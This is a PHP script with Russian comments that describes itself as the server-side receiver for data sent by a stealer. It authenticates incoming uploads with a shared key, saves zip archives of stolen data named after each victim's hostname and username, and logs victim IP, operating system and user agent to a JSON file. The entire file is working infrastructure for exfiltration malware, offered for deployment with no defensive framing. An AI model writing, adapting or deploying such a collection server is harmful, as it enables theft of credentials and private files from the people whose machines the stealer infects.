<?php
/**
 * upload.php - Приемник данных от стилера
 * Разместить на своем сервере с поддержкой PHP
 */

// ===== НАСТРОЙКИ =====
$AUTH_KEY = 'ТВОЙ_СЕКРЕТНЫЙ_КЛЮЧ_12345';  // Должен совпадать с ключом в стилере
$UPLOAD_DIR = 'uploads/';                   // Папка для сохранения архивов
$MAX_FILE_SIZE = 50 * 1024 * 1024;          // Максимальный размер: 50 МБ
// =====================

// Включаем отображение ошибок (отключить в production)
// error_reporting(0);
// ini_set('display_errors', 0);

// Функция логирования
function log_event($message) {
    $log_file = 'receiver.log';
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $log_line = "[$timestamp] [$ip] $message" . PHP_EOL;
    file_put_contents($log_file, $log_line, FILE_APPEND);
}

// Проверка метода запроса
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die('Method Not Allowed');
}

// Проверка авторизации
$received_key = $_POST['auth_key'] ?? '';
if ($received_key !== $AUTH_KEY) {
    log_event("ОТКАЗ: Неверный ключ авторизации");
    http_response_code(403);
    die('Forbidden');
}

// Проверка наличия файла
if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
    $error_code = $_FILES['file']['error'] ?? 'no_file';
    log_event("ОШИБКА: Файл не получен. Код: $error_code");
    http_response_code(400);
    die('No file uploaded');
}

// Проверка размера файла
if ($_FILES['file']['size'] > $MAX_FILE_SIZE) {
    $size_mb = round($_FILES['file']['size'] / (1024*1024), 2);
    log_event("ОТКАЗ: Файл слишком большой ($size_mb МБ)");
    http_response_code(413);
    die('File too large');
}

// Проверка расширения
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if ($ext !== 'zip') {
    log_event("ОТКАЗ: Неверное расширение ($ext)");
    http_response_code(400);
    die('Invalid file type');
}

// Создание папки для загрузок, если не существует
if (!is_dir($UPLOAD_DIR)) {
    mkdir($UPLOAD_DIR, 0755, true);
}

// Сбор метаданных
$hostname = $_POST['hostname'] ?? 'unknown';
$username = $_POST['username'] ?? 'unknown';
$os = $_POST['os'] ?? 'unknown';
$ip = $_POST['ip'] ?? $_SERVER['REMOTE_ADDR'];
$timestamp = $_POST['timestamp'] ?? date('Y-m-d_H-i-s');

// Очистка имени хоста для безопасного имени файла
$safe_hostname = preg_replace('/[^a-zA-Z0-9_-]/', '_', $hostname);
$safe_username = preg_replace('/[^a-zA-Z0-9_-]/', '_', $username);

// Имя файла: hostname_username_timestamp.zip
$filename = "{$safe_hostname}_{$safe_username}_" . date('Y-m-d_H-i-s') . '.zip';
$destination = $UPLOAD_DIR . $filename;

// Сохранение файла
if (move_uploaded_file($_FILES['file']['tmp_name'], $destination)) {
    $file_size = round(filesize($destination) / 1024, 2);
    log_event("УСПЕХ: $filename сохранен ($file_size КБ) | ОС: $os | Хост: $hostname | Польз: $username | IP: $ip");
    
    // Сохранение метаданных в отдельный файл
    $meta_filename = $UPLOAD_DIR . pathinfo($filename, PATHINFO_FILENAME) . '.json';
    $meta_data = [
        'filename' => $filename,
        'hostname' => $hostname,
        'username' => $username,
        'os' => $os,
        'victim_ip' => $ip,
        'timestamp_received' => date('Y-m-d H:i:s'),
        'file_size_kb' => $file_size,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
    ];
    file_put_contents($meta_filename, json_encode($meta_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
    
    // Ответ стилеру
    http_response_code(200);
    echo json_encode(['status' => 'ok', 'file' => $filename]);
} else {
    log_event("ОШИБКА: Не удалось сохранить файл $filename");
    http_response_code(500);
    die('Server error');
}
?>
